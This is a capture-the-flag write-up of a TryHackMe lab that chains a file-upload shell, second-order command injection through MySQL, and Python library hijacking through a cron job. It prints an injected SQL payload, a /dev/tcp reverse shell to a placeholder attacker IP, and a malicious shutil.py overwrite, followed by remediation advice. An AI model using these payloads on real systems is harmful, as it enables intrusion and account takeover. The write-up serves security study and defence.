# CTF Room Writeup: Dreaming
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Time to Complete:** 5 Days  
**Date:** July 2026  
**Author:** Pluto

---

## Table of Contents
1. [Room Overview](#room-overview)
2. [Tools Used](#tools-used)
3. [Attack Chain Summary](#attack-chain-summary)
4. [Phase 1 — Initial Access](#phase-1--initial-access)
5. [Phase 2 — Privilege Escalation to Death](#phase-2--privilege-escalation-to-death)
6. [Phase 3 — Privilege Escalation to Morpheus](#phase-3--privilege-escalation-to-morpheus)
7. [Vulnerabilities Identified](#vulnerabilities-identified)
8. [Key Lessons Learned](#key-lessons-learned)
9. [Remediation Recommendations](#remediation-recommendations)

---

## Room Overview

The Dreaming room involves a multi-stage privilege escalation chain on a Linux system. Starting from an externally accessible web application, the objective is to exploit a series of vulnerabilities to move from an unauthenticated attacker, through three user accounts (lucien → death → morpheus), ultimately collecting each user's flag along the way.

**Flags collected:**
- `lucien_flag.txt` — obtained via initial web application exploitation
- `death_flag.txt` — obtained via second-order command injection through MySQL database manipulation
- `morpheus_flag.txt` — obtained via Python library hijacking through cron job abuse

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network and service enumeration |
| Web browser / Burp Suite | Web application reconnaissance |
| Netcat | Reverse shell listener |
| MySQL client | Database enumeration and manipulation |
| pspy64 | Process monitoring without root privileges |
| LinPEAS | Automated privilege escalation enumeration |
| Python3 | Shell stabilisation and HTTP server for file transfer |
| searchsploit | Offline exploit database searching |

---

## Attack Chain Summary

```
[External Attacker]
        |
        v
[Web Application — Weak Credentials]
        |
        v
[File Upload Vulnerability — PHP/PHAR Shell]
        |
        v
[Shell as www-data / lucien]
        |
        v
[MySQL History File — Credential Discovery]
        |
        v
[Database Write Access — Command Injection Payload]
        |
        v
[Sudo Rule Abuse — Code Execution as Death]
        |
        v
[death_flag.txt CAPTURED]
        |
        v
[Reverse Shell as Death — getDreams.py Source Read]
        |
        v
[Python Library Hijacking — shutil.py Overwrite]
        |
        v
[Cron Job Abuse — Code Execution as Morpheus]
        |
        v
[morpheus_flag.txt CAPTURED]
```

---

## Phase 1 — Initial Access

### 1.1 Web Application Discovery

Upon accessing the target, a web application was identified running on the standard HTTP port. The application appeared to be a content management system (Pluck version 4.7.13).

### 1.2 Authentication Bypass via Weak Credentials

The administrative login panel was located. Default and weak credentials were attempted, and access was gained using a simple, guessable password. This highlights the risk of deploying web applications without enforcing strong authentication policies.

**Vulnerability:** Weak/default credentials on web application admin panel.

### 1.3 Remote Code Execution via File Upload

Once authenticated as an administrator, the file upload functionality was abused to upload a malicious file (a PHAR shell) that was executable by the web server. This provided a reverse shell connection back to the attacker's Kali machine.

**Steps:**
1. Identified file upload functionality in the admin panel
2. Crafted a malicious PHAR file containing a PHP reverse shell payload
3. Started a Netcat listener on Kali: `nc -lvnp 4444`
4. Uploaded the shell file through the admin panel
5. Triggered execution by navigating to the uploaded file's URL
6. Received a reverse shell connection

**Vulnerability:** Unrestricted file upload allowing executable file types.

### 1.4 Local Enumeration as Lucien

After gaining shell access, standard post-exploitation enumeration was performed:

```bash
whoami
id
ls /home
cat /home/lucien/lucien_flag.txt
```

The `lucien_flag.txt` was directly readable, yielding the first flag.

---

## Phase 2 — Privilege Escalation to Death

### 2.1 Sudo Rights Enumeration

Checking lucien's sudo permissions revealed a specific, narrow rule:

```bash
sudo -l
```

**Output:**
```
User lucien may run the following commands on this host:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

This means lucien could execute a specific Python script as the user death, without requiring a password. The script path was fixed — no arguments could be appended without breaking the sudo match.

**Vulnerability:** Overly permissive sudo rule allowing execution of a script as a privileged user.

### 2.2 MySQL History File Analysis

During enumeration of the filesystem, a MySQL history file was discovered:

```bash
cat /home/lucien/.mysql_history
```

This file contained historical SQL queries revealing the existence of a database called `library` with tables named `dreams` and `dreamers`. The queries showed that data from these tables was being used in shell commands, strongly suggesting command injection potential.

**Vulnerability:** Sensitive database query history stored in plaintext on disk.

### 2.3 Database Enumeration

Using credentials discovered during enumeration, the MySQL database was accessed:

```bash
mysql -u lucien -p library
```

```sql
SHOW TABLES;
SELECT * FROM dreams;
```

**Output:**
```
+----------+-----------------------------------+
| dreamer  | dream                             |
+----------+-----------------------------------+
| Alice    | Flying in the sky                 |
| Bob      | Exploring ancient ruins           |
| Carol    | Becoming a successful entrepreneur|
| Dave     | Becoming a professional musician  |
+----------+-----------------------------------+
```

### 2.4 Source Code Analysis — getDreams.py

By obtaining a death shell later in the engagement (see Phase 2.6), the source code of `getDreams.py` was read:

```python
# MySQL credentials
DB_USER = "death"
DB_PASS = "!mementoMORI666!"
DB_NAME = "library"

def getDreams():
    try:
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )
        cursor = connection.cursor()
        query = "SELECT dreamer, dream FROM dreams;"
        cursor.execute(query)
        dreams_info = cursor.fetchall()

        for dream_info in dreams_info:
            dreamer, dream = dream_info
            command = f"echo {dreamer} + {dream}"
            shell = subprocess.check_output(command, text=True, shell=True)
            print(shell)
```

**Critical finding:** The script constructs shell commands by directly concatenating database values into an `echo` statement and passes them to `subprocess.check_output` with `shell=True`. This means any special shell characters in the database values are interpreted by the shell — a classic second-order command injection vulnerability.

**Vulnerability:** Unsanitised database values passed to `subprocess.check_output` with `shell=True`.

### 2.5 Second-Order Command Injection

Since lucien had INSERT and UPDATE permissions on the `dreams` table, a malicious payload was injected:

```sql
INSERT INTO dreams (dreamer, dream) VALUES ('test', ';cp /home/death/death_flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt && echo done');
```

**How the injection works:**

When the script runs as death and processes this row, it builds the command:

```bash
echo test + ;cp /home/death/death_flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt && echo done
```

The semicolon (`;`) terminates the `echo` command early, and everything after it executes as a separate shell command — running as death with death's file permissions.

**Triggering the payload:**
```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

**Reading the flag:**
```bash
cat /tmp/flag.txt
```

**Flag captured:** `death_flag.txt`

### 2.6 Obtaining an Interactive Shell as Death

For further enumeration, a reverse shell payload was injected into the database:

```sql
INSERT INTO dreams (dreamer, dream) VALUES ('test4', ';nohup bash -c "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1" &');
```

The `nohup` and background operator (`&`) were necessary because `subprocess.check_output` expects a clean exit — running the shell in the background prevented the script from blocking or crashing.

**Shell stabilisation:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 columns 116
```

---

## Phase 3 — Privilege Escalation to Morpheus

### 3.1 Enumeration of Morpheus's Environment

From the death shell, the morpheus home directory was examined:

```bash
ls -la /home/morpheus/
```

**Key files identified:**
- `morpheus_flag.txt` — permissions `-rw-rw----` (only morpheus user and group can read)
- `restore.py` — permissions `-rw-rw-r--` (world-readable)
- `kingdom` — a file being backed up by restore.py

**Reading restore.py:**
```python
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

**Vulnerability identified:** The script imports `shutil` — if a malicious `shutil.py` can be placed somewhere earlier in Python's module search path, it will be imported instead of the real standard library module.

### 3.2 Cron Job Discovery with pspy64

Since `/var/spool/cron/crontabs/` was not readable, pspy64 was transferred to the target and used to monitor all running processes in real time:

```bash
# On Kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 8000

# On target
wget http://<KALI_IP>:8000/pspy64
chmod +x /tmp/pspy64
./pspy64
```

**Critical pspy output:**
```
CMD: UID=1002  PID=122525 | /bin/sh -c /usr/bin/python3.8 /home/morpheus/restore.py
```

This confirmed that morpheus (UID=1002) runs `restore.py` automatically every minute via a cron job.

**Vulnerability:** Cron job running a Python script that imports a standard library module, without controlling the Python module search path.

### 3.3 Python Module Search Path Analysis

Python searches for modules in a specific order defined by `sys.path`. The first directory in the path takes priority. A writable location earlier in the path than the real `shutil.py` would allow hijacking the import.

Checking writable directories as death:

```bash
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | grep -v dev
```

The key discovery was that `/usr/lib/python3.8/` — which contains the real `shutil.py` — was writable by death. This meant the real module could be directly overwritten.

### 3.4 Python Library Hijacking

The real `shutil.py` was overwritten with a malicious version:

```bash
cat > /usr/lib/python3.8/shutil.py << 'EOF'
import os

def copy2(src, dst):
    os.system('cp /home/morpheus/morpheus_flag.txt /tmp/mflag.txt && chmod 777 /tmp/mflag.txt')
EOF
```

**Why the `copy2` function definition is required:**  
`restore.py` calls `copy2()` after importing it from `shutil`. If the function doesn't exist in the fake module, Python raises an `AttributeError` and the script crashes before completing. Defining `copy2` as a wrapper around the malicious `os.system` call ensures the script runs cleanly while executing the payload.

### 3.5 Flag Capture

Within 60 seconds, morpheus's cron job fired, importing the malicious `shutil.py` and executing the payload as morpheus:

```bash
cat /tmp/mflag.txt
```

**Flag captured:** `morpheus_flag.txt`

---

## Vulnerabilities Identified

### 1. Weak Web Application Credentials
**Severity:** High  
**Description:** The Pluck content management system was accessible with a trivially guessable administrator password, allowing full administrative access without any account lockout or rate limiting.  
**Impact:** Complete administrative takeover of the web application.

### 2. Unrestricted File Upload
**Severity:** Critical  
**Description:** The authenticated file upload functionality accepted and served executable file types (PHAR), allowing an attacker to upload and execute arbitrary server-side code.  
**Impact:** Remote code execution on the web server, leading to initial system access.

### 3. Sensitive Data in History Files
**Severity:** Medium  
**Description:** MySQL command history was stored in plaintext at `/home/lucien/.mysql_history`, revealing database schema details, table names, and query patterns that directly aided further exploitation.  
**Impact:** Information disclosure accelerating privilege escalation.

### 4. Sudo Misconfiguration
**Severity:** High  
**Description:** The sudoers rule permitting lucien to run `getDreams.py` as death did not account for what data the script consumed. Controlling the script's input (via the database) effectively meant controlling what code ran as death.  
**Impact:** Indirect code execution as the death user.

### 5. Second-Order Command Injection
**Severity:** Critical  
**Description:** `getDreams.py` constructed shell commands by directly concatenating unsanitised database values and passed them to `subprocess.check_output` with `shell=True`. Data inserted by lucien into the database was later executed as shell commands by death.  
**Impact:** Arbitrary command execution as death, leading to flag capture and interactive shell access.

### 6. Hardcoded Credentials in Script
**Severity:** High  
**Description:** Database credentials for the death user were stored in plaintext inside `getDreams.py` (`DB_PASS = "!mementoMORI666!"`), readable once shell access as death was obtained.  
**Impact:** Credential exposure — if password reuse existed, this could have escalated to further access.

### 7. Python Library Hijacking via Writable Standard Library Path
**Severity:** Critical  
**Description:** The `/usr/lib/python3.8/` directory, which contains Python's standard library modules including `shutil.py`, was writable by the death user. This allowed overwriting the legitimate module with a malicious version.  
**Impact:** Arbitrary code execution as morpheus via cron job abuse.

### 8. Cron Job Running User-Influenceable Python Script
**Severity:** High  
**Description:** morpheus's cron job executed `restore.py` every minute without specifying a controlled Python environment or module path. Combined with a writable standard library directory, this created a reliable code execution path as morpheus.  
**Impact:** Privilege escalation from death to morpheus, leading to flag capture.

---

## Key Lessons Learned

### For Offensive Security (Attack Perspective)

**Always read history files early.** The `.bash_history`, `.mysql_history`, and `.viminfo` files often contain credentials, schema information, and command patterns that directly reveal exploitation paths. These should be among the first files checked after gaining shell access.

**Understand what sudo rules actually do, not just what they permit.** The lucien → death sudo rule looked narrow and harmless on the surface. Understanding that the permitted script consumed database data — data lucien could write — revealed an indirect code execution path that a surface-level review would miss.

**`shell=True` in Python subprocess calls is a red flag.** Any Python script using `subprocess` with `shell=True` and incorporating external data (database values, user input, file contents) is a potential command injection target. Always look for this pattern when reviewing script source code.

**Use pspy64 for cron job discovery when `/var/spool/cron/` is unreadable.** Process monitoring tools like pspy64 reveal scheduled tasks without requiring elevated privileges or direct access to crontab files. This is an essential tool for privilege escalation enumeration on restricted systems.

**Check Python's module search path when a script imports standard library modules.** If any directory earlier in `sys.path` than the real module location is writable, library hijacking becomes possible. Always check `python3 -c "import sys; print(sys.path)"` and cross-reference with writable directories.

**Stabilise reverse shells before doing complex enumeration.** An unstable shell caused several failed `sudo -l` attempts during this engagement because the command hung waiting for terminal input. Always stabilise with `pty.spawn` + `stty raw -echo` before proceeding.

### For Defensive Security (Blue Team Perspective)

**Enforce strong password policies on all web applications**, including content management systems. Implement account lockout and rate limiting on login endpoints.

**Validate and restrict file uploads strictly** — whitelist allowed extensions, store uploaded files outside the web root, and never serve uploaded files with executable permissions.

**Never pass database values or user input into shell commands**, especially with `shell=True`. Use parameterised subprocess calls with argument lists instead, which avoids shell interpretation entirely.

**Restrict file permissions on sensitive directories**, including Python's standard library. Standard library directories should be owned by root and not writable by any non-root user.

**Audit sudo rules carefully.** A rule that looks narrow may still be exploitable if the permitted script interacts with data controllable by the requesting user.

**Rotate credentials and never hardcode them in scripts.** Credentials should be stored in environment variables or dedicated secrets management solutions, not in plaintext inside executable files.

---

## Remediation Recommendations

| Vulnerability | Recommended Fix |
|---------------|----------------|
| Weak credentials | Enforce strong password policy, implement account lockout |
| Unrestricted file upload | Whitelist extensions, store outside web root, strip execute permissions |
| MySQL history disclosure | Disable history logging or restrict file permissions to owner-only |
| Sudo misconfiguration | Remove the sudo rule or replace the script with one that does not consume external data |
| Command injection in getDreams.py | Remove `shell=True`, use parameterised subprocess argument lists |
| Hardcoded credentials | Use environment variables or a secrets manager |
| Writable Python library directory | Set `/usr/lib/python3.8/` to root-owned with `755` permissions |
| Cron job abuse | Specify `PYTHONPATH` explicitly in cron, use virtual environments, audit writable paths |

---

## Conclusion

The Dreaming room demonstrates how a chain of individually exploitable vulnerabilities — none of which requires advanced tooling — can be combined to achieve full system compromise. The most technically interesting element was the second-order command injection: the malicious payload was not dangerous when inserted, only becoming dangerous when a privileged process later consumed it from the database without sanitisation. This mirrors real-world supply chain and injection attack patterns.

The morpheus escalation via Python library hijacking is equally instructive — standard library directories should never be writable by unprivileged users, yet this misconfiguration is not uncommon on systems where developers have been granted broad write access for package management purposes.

Both vulnerabilities are directly relevant to the Offensive Security Certified Professional examination and to real penetration testing engagements.

---

*Written by Pluto | Cybersecurity Student | TryHackMe Profile: smith.onimisiste*  
*Certifications: CompTIA Security+, Cisco Certified Network Associate*  
*Working toward: eJPT, OSCP*
